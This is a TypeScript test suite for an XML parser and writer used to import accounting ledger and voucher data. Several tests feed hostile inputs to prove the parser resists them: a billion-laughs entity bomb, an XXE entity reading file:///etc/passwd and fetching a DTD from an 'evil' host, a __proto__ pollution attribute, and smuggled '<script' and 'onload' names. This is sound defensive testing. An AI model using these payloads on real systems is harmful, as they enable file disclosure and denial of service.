import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { FileFormatError, decodeText } from './text.ts';
import {
  childElements,
  decodeXmlEntities,
  escapeAttr,
  escapeXml,
  findAll,
  firstChild,
  localName,
  parseXml,
  rawXml,
  saxParse,
  serializeXml,
  stripInvalidXmlChars,
  textOf,
  xmlElement,
} from './xml.ts';
import type { XmlElement } from './xml.ts';
import { MESSAGE_CLOSE, MESSAGE_OPEN, MESSAGE_TAG, REQUEST_TAG } from '../modules/data/xmlFormat.ts';

/** Assert that `fn` throws FileFormatError('xml') at line/column with a message matching `re`. */
function throwsAt(fn: () => unknown, re: RegExp, line: number, column: number): void {
  assert.throws(fn, (err: unknown) => {
    assert.ok(err instanceof FileFormatError, `expected FileFormatError, got ${String(err)}`);
    assert.equal(err.format, 'xml');
    assert.match(err.message, re);
    assert.deepEqual({ line: err.line, column: err.column }, { line, column });
    return true;
  });
}

const SAMPLE_ENVELOPE = `<?xml version="1.0" encoding="UTF-16"?>
<!-- exported by another accounting program -->
<ENVELOPE>
  <HEADER><${REQUEST_TAG}>Import Data</${REQUEST_TAG}></HEADER>
  <BODY>
    <IMPORTDATA>
      <REQUESTDATA>
        ${MESSAGE_OPEN}
          <LEDGER NAME="Ram &amp; Sons" ACTION='Create'>
            <PARENT>Sundry Debtors</PARENT>
            <OPENINGBALANCE>-1250.00</OPENINGBALANCE>
            <UDF:GSTREGTYPE.LIST DESC="\`GST Reg Type\`" ISLIST="YES" TYPE="String" INDEX="1">
              <UDF:GSTREGTYPE DESC="\`GST Reg Type\`">Regular</UDF:GSTREGTYPE>
            </UDF:GSTREGTYPE.LIST>
          </LEDGER>
        ${MESSAGE_CLOSE}
        ${MESSAGE_OPEN}
          <LEDGER NAME="Cash" ACTION="Create"><PARENT>Cash-in-Hand</PARENT><EMPTY/></LEDGER>
        ${MESSAGE_CLOSE}
      </REQUESTDATA>
    </IMPORTDATA>
  </BODY>
</ENVELOPE>
`;

describe('parseXml', () => {
  it('parses an Import Data envelope: declaration, comments, attributes with both quotes, self-closing, namespaces', () => {
    const root = parseXml(SAMPLE_ENVELOPE);
    assert.equal(root.name, 'ENVELOPE');
    assert.equal(textOf(firstChild(firstChild(root, 'HEADER'), REQUEST_TAG)), 'Import Data');
    const ledgers = findAll(root, `BODY/IMPORTDATA/REQUESTDATA/${MESSAGE_TAG}/LEDGER`);
    assert.equal(ledgers.length, 2);
    assert.deepEqual(ledgers[0].attrs, { NAME: 'Ram & Sons', ACTION: 'Create' });
    assert.equal(textOf(firstChild(ledgers[0], 'OPENINGBALANCE')), '-1250.00');
    const udf = firstChild(ledgers[0], 'UDF:GSTREGTYPE.LIST') as XmlElement;
    assert.equal(udf.attrs.DESC, '`GST Reg Type`');
    assert.equal(textOf(firstChild(udf, 'UDF:GSTREGTYPE')), 'Regular');
    assert.equal(localName(udf.name), 'GSTREGTYPE.LIST');
    assert.deepEqual(firstChild(ledgers[1], 'EMPTY'), { name: 'EMPTY', attrs: {}, children: [] });
    assert.deepEqual(
      childElements(ledgers[1]).map((e) => e.name),
      ['PARENT', 'EMPTY'],
    );
    // Indentation-only text is dropped between elements.
    assert.ok(ledgers[0].children.every((c) => typeof c !== 'string'));
  });

  it('decodes the 5 predefined entities and numeric references in text and attributes', () => {
    const root = parseXml('<a t="&lt;&gt;&amp;&quot;&apos; &#65;&#x42;">&lt;b&gt; &amp;amp; &#8377;&#x20B9; &#x1F600; &quot;q&apos;</a>');
    assert.equal(root.attrs.t, `<>&"' AB`);
    assert.equal(textOf(root), '<b> &amp; ₹₹ 😀 "q\'');
  });

  it('keeps unknown entities, invalid references and bare ampersands literally', () => {
    const root = parseXml('<a>&nbsp; &custom; AT&T &#0; &#xD800; &#xFFFFFFF; &; &#x; &lt</a>');
    assert.equal(textOf(root), '&nbsp; &custom; AT&T &#0; &#xD800; &#xFFFFFFF; &; &#x; &lt');
    assert.equal(decodeXmlEntities('&constructor; &toString; &__proto__;'), '&constructor; &toString; &__proto__;');
  });

  it('returns CDATA verbatim and merges it with adjacent text', () => {
    const root = parseXml('<a>x <![CDATA[<b>&amp; ]]]]><![CDATA[>]]> y</a>');
    assert.deepEqual(root.children, ['x <b>&amp; ]]> y']);
  });

  it('does NOT expand a billion-laughs DOCTYPE (entities stay literal, parse is instant)', () => {
    const lol = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ELEMENT lolz (#PCDATA)>
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz a="&lol9;">&lol9;</lolz>`;
    const t0 = performance.now();
    const root = parseXml(lol);
    assert.ok(performance.now() - t0 < 100);
    assert.equal(root.name, 'lolz');
    assert.equal(textOf(root), '&lol9;');
    assert.equal(root.attrs.a, '&lol9;');
  });

  it('never resolves external entities (XXE) and skips tricky DOCTYPE subsets safely', () => {
    const xxe = `<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd"> <!ENTITY % p SYSTEM "http://evil/x.dtd"> %p;]><r>&xxe;</r>`;
    assert.equal(textOf(parseXml(xxe)), '&xxe;');
    const tricky = `<!DOCTYPE r PUBLIC "-//X//DTD >" 'q>' [ <!-- ] > --> <!ENTITY e "]>"> ]><r>ok</r>`;
    assert.equal(textOf(parseXml(tricky)), 'ok');
    throwsAt(() => parseXml('<!DOCTYPE r [ <!ENTITY e "x">'), /Unterminated DOCTYPE/, 1, 1);
    throwsAt(() => parseXml('<r><!DOCTYPE r></r>'), /DOCTYPE is only allowed before the root/, 1, 4);
  });

  it('handles whitespace: drops indentation, keeps text-only whitespace, normalises CRLF', () => {
    const root = parseXml('<a>\r\n  <b>  x  </b>\r\n  <c> </c>\r\n  <d>line1\r\nline2\rline3</d>\r\n</a>');
    assert.deepEqual(childElements(root).map((e) => e.children), [['  x  '], [' '], ['line1\nline2\nline3']]);
    assert.equal(textOf(root.children[0]), 'x');
    assert.equal(textOf(root.children[0], { trim: false }), '  x  ');
    const kept = parseXml('<a>\n <b/>\n</a>', { preserveWhitespace: true });
    assert.deepEqual(kept.children, ['\n ', { name: 'b', attrs: {}, children: [] }, '\n']);
    // Mixed content keeps meaningful text.
    assert.deepEqual(parseXml('<p>Hello <b>World</b>!</p>').children, ['Hello ', { name: 'b', attrs: {}, children: ['World'] }, '!']);
  });

  it('normalises attribute whitespace but keeps character references', () => {
    const root = parseXml('<a v="x\n\ty" w="1&#10;2&#9;3" e=""/>');
    assert.deepEqual(root.attrs, { v: 'x  y', w: '1\n2\t3', e: '' });
  });

  it('stores a "__proto__" attribute as an own property (no prototype pollution)', () => {
    const root = parseXml('<a __proto__="x" constructor="y"/>');
    assert.equal(Object.getPrototypeOf(root.attrs), Object.prototype);
    assert.equal(root.attrs['__proto__'], 'x');
    assert.equal(root.attrs.constructor, 'y');
  });

  it('reports malformed input with precise line/column', () => {
    throwsAt(() => parseXml('<a>\n  <b>\n  </c>\n</a>'), /Mismatched closing tag <\/c>; expected <\/b> \(opened at line 2, column 3\)/, 3, 3);
    throwsAt(() => parseXml('<a>\n<b>text</b>'), /<a> is not closed/, 1, 1);
    throwsAt(() => parseXml('<a><!-- never ends</a>'), /Unterminated comment/, 1, 4);
    throwsAt(() => parseXml('<a x="1" x="2"/>'), /Duplicate attribute "x"/, 1, 10);
    throwsAt(() => parseXml('<a x=1/>'), /must be quoted/, 1, 6);
    throwsAt(() => parseXml('<a x/>'), /Attribute "x" has no value/, 1, 5);
    throwsAt(() => parseXml('<a x="1"y="2"/>'), /Whitespace is required/, 1, 9);
    throwsAt(() => parseXml('<a x="<b>"/>'), /"<" is not allowed/, 1, 7);
    throwsAt(() => parseXml('<a x="1/>'), /Unterminated value/, 1, 6);
    throwsAt(() => parseXml('junk<a/>'), /Text is not allowed outside the root/, 1, 1);
    throwsAt(() => parseXml('<a/>\n<b/>'), /Only one root element/, 2, 1);
    throwsAt(() => parseXml('<?xml version="1.0"?>\n<!-- c -->\n'), /No root element/, 3, 1);
    throwsAt(() => parseXml('<a></a>\n</a>'), /Unexpected closing tag <\/a>/, 2, 1);
    throwsAt(() => parseXml('<a><1b/></a>'), /cannot start with a digit/, 1, 5);
    throwsAt(() => parseXml('<a>< b/></a>'), /Expected an element name/, 1, 4);
    throwsAt(() => parseXml('<a><![CDATA[x</a>'), /Unterminated CDATA/, 1, 4);
    throwsAt(() => parseXml('<a><!ELEMENT x></a>'), /Invalid markup/, 1, 4);
    throwsAt(() => parseXml('<a'), /Unexpected end of document inside tag <a>/, 1, 1);
  });

  it('enforces maxDepth and maxNodes with clear errors', () => {
    const nested = (n: number): string => '<d>'.repeat(n) + '</d>'.repeat(n);
    assert.equal(parseXml(nested(256)).name, 'd');
    throwsAt(() => parseXml(nested(257)), /deeper than the limit of 256 levels/, 1, 769);
    throwsAt(() => parseXml(nested(10), { maxDepth: 5 }), /deeper than the limit of 5/, 1, 16);
    const many = `<r>${'<i/>'.repeat(100)}</r>`;
    assert.equal(parseXml(many, { maxNodes: 101 }).children.length, 100);
    throwsAt(() => parseXml(many, { maxNodes: 100 }), /more than the limit of 100 elements/, 1, 400);
  });

  it('decodes a BOM-less UTF-16LE XML data export with decodeText before parsing', () => {
    const bytes = new Uint8Array(Buffer.from(SAMPLE_ENVELOPE, 'utf16le'));
    const decoded = decodeText(bytes);
    assert.equal(decoded.encoding, 'utf-16le');
    const root = parseXml(decoded.text);
    assert.equal(findAll(root, (e) => e.name === 'LEDGER').length, 2);
  });

  it('parses large documents fast and is not quadratic on pathological input', () => {
    const voucher =
      '<VOUCHER VCHTYPE="Sales"><DATE>20240401</DATE><NARRATION>Sale &amp; delivery</NARRATION>' +
      '<ALLLEDGERENTRIES.LIST><LEDGERNAME>Sales</LEDGERNAME><AMOUNT>1000.00</AMOUNT></ALLLEDGERENTRIES.LIST></VOUCHER>\n';
    const big = `<ENVELOPE>\n${voucher.repeat(50_000)}</ENVELOPE>`; // ≈ 9 MB
    let t0 = performance.now();
    const root = parseXml(big);
    assert.equal(root.children.length, 50_000);
    assert.ok(performance.now() - t0 < 4000, 'large parse too slow');
    const amps = `<a>${'&'.repeat(1_000_000)}${'&amp'.repeat(200_000)}</a>`;
    t0 = performance.now();
    assert.equal(textOf(parseXml(amps)).length, 1_800_000);
    assert.ok(performance.now() - t0 < 2000, 'ampersand run too slow');
  });
});

describe('saxParse', () => {
  it('emits events in document order (self-closing, comments, PIs, CDATA)', () => {
    const events: string[] = [];
    saxParse('<?xml version="1.0"?><!--c--><r a="1"><x/>t&amp;<![CDATA[<d>]]><?pi data here?></r>', {
      open: (name, attrs, selfClosing) => events.push(`open ${name} ${JSON.stringify(attrs)} ${selfClosing}`),
      close: (name) => events.push(`close ${name}`),
      text: (t) => events.push(`text ${t}`),
      comment: (t) => events.push(`comment ${t}`),
      processingInstruction: (target, data) => events.push(`pi ${target} ${data}`),
    });
    assert.deepEqual(events, [
      'pi xml version="1.0"',
      'comment c',
      'open r {"a":"1"} false',
      'open x {} true',
      'close x',
      'text t&',
      'text <d>',
      'pi pi data here',
      'close r',
    ]);
  });

  it('lets a handler abort early by throwing', () => {
    const stop = new Error('stop');
    let opened = 0;
    assert.throws(
      () =>
        saxParse('<r><a/><b/><c/></r>', {
          open() {
            if (++opened === 2) throw stop;
          },
        }),
      (e: unknown) => e === stop,
    );
    assert.equal(opened, 2);
  });
});

describe('tree helpers', () => {
  const root = parseXml('<r><a k="1">x<b>y</b></a><a k="2"/><c><a k="3"><b>z</b></a></c></r>');

  it('childElements / firstChild / textOf', () => {
    assert.deepEqual(childElements(root, 'a').map((e) => e.attrs.k), ['1', '2']);
    assert.equal(childElements(root).length, 3);
    assert.equal(firstChild(root, 'c')?.name, 'c');
    assert.equal(firstChild(root, 'zz'), undefined);
    assert.equal(firstChild(undefined, 'a'), undefined);
    assert.equal(textOf(root), 'xyz');
    assert.equal(textOf(undefined), '');
  });

  it('findAll by path (with * wildcard) and by predicate in document order', () => {
    assert.deepEqual(findAll(root, 'a').map((e) => e.attrs.k), ['1', '2']);
    assert.deepEqual(findAll(root, 'c/a/b').map((e) => textOf(e)), ['z']);
    assert.deepEqual(findAll(root, '*/b').map((e) => textOf(e)), ['y']);
    assert.deepEqual(findAll(root, '/a/').map((e) => e.attrs.k), ['1', '2']);
    assert.deepEqual(findAll(root, ''), []);
    assert.deepEqual(findAll(root, (e) => e.name === 'a').map((e) => e.attrs.k), ['1', '2', '3']);
    assert.deepEqual(findAll(root, (e) => e.name === 'b').map((e) => textOf(e)), ['y', 'z']);
  });
});

describe('XML writer', () => {
  it('escapes text and attributes and strips XML-invalid characters', () => {
    assert.equal(escapeXml('a<b>&c "q" \'s\' \r'), 'a&lt;b&gt;&amp;c "q" \'s\' &#13;');
    assert.equal(escapeAttr('a<b>&"\'\t\n\r'), 'a&lt;b&gt;&amp;&quot;&apos;&#9;&#10;&#13;');
    assert.equal(stripInvalidXmlChars('a\u0000b\u0008c\u000Bd\u001Fe\tf\ng￾h\uD800i😀'), 'abcde\tf\nghi😀');
    assert.equal(escapeXml('plain ₹ text'), 'plain ₹ text');
  });

  it('builds elements with escaped content, nested nodes and raw fragments', () => {
    const inner = xmlElement('LEDGERNAME', null, ['Ram & Sons <Pune>']);
    const xml = xmlElement('ENVELOPE', { VERSION: 1, SKIP: null, 'UDF:X': 'a"b' }, [
      rawXml(inner),
      { name: 'AMOUNT', attrs: {}, children: ['-1000.00'] },
      rawXml(xmlElement('EMPTY', {})),
      12.5,
      null,
      '=cmd|',
    ]);
    assert.equal(
      xml,
      '<ENVELOPE VERSION="1" UDF:X="a&quot;b"><LEDGERNAME>Ram &amp; Sons &lt;Pune&gt;</LEDGERNAME>' +
        '<AMOUNT>-1000.00</AMOUNT><EMPTY/>12.5=cmd|</ENVELOPE>',
    );
    // A plain string child is always text, even if it looks like markup (secure default).
    assert.equal(xmlElement('a', null, [xmlElement('b', null)]), '<a>&lt;b/&gt;</a>');
    assert.throws(() => xmlElement('bad name', {}), TypeError);
    assert.throws(() => xmlElement('a><script', {}), TypeError);
    assert.throws(() => xmlElement('a', { 'x="1" onload': 'y' }), TypeError);
  });

  it('round-trips parse → serialize → parse', () => {
    const src = '<r a="1 &amp; 2" b="&#10;"><x>&lt;tag&gt; ₹ "q"</x><y/><z>a<w>b</w>c</z></r>';
    const tree = parseXml(src);
    assert.deepEqual(parseXml(serializeXml(tree)), tree);
  });
});
